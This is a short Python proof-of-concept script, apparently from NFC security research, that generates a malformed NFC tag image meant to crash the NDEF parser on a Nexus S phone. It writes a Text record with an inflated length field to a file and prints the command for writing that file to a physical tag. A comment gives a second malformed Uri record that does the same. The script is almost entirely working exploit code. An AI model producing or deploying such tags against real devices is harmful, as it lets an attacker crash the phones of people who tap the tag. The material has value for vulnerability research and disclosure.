#!/usr/bin/python

#
# Copyright: Collin Mulliner <collin@mulliner.org>
# Web: http://www.mulliner.org/nfc/
#
# License: GPLv2
#

import NFCTagType1
import NDEFSmartPoster
import NDEFUri
import NDEFTextRecord
import NDEFMessage
import os

outfile = "/tmp/nexus_s_ndef_parse_crash.mf"
print "writing: " + outfile
print "write file to tag using: ndef_mifare -w " + outfile

tag = NFCTagType1.NFCTagType1()
tag.setNDEF("D10103540F656E")
# TextRecord "T" = 54, length = 0F, 656E = "en"
# also works with Uri record: D1010155FF "U" = 55, length = FF
fp = open(outfile, 'wb')
fp.write(tag.getTag(0))
fp.close()
